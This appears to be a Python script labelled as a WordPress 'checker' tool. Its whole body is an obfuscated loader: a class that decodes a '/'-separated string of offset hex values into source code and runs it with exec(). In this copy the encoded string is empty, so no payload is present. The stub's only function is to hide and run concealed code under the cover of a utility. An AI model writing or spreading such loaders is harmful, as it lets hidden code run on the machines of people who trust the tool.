# STRANGER VAULT WP CHECKER 

class Stranger():
    def __init__(self, data):
        self._d = data
        self._s = 500000
        self._x = __import__('binascii')
        self.run()
    def run(self):
        
        _decoded = "".join(chr(int(i, 16) - self._s) for i in self._d.split('/'))
        return exec(_decoded, globals())

if __name__ == "__main__":
    Stranger("")
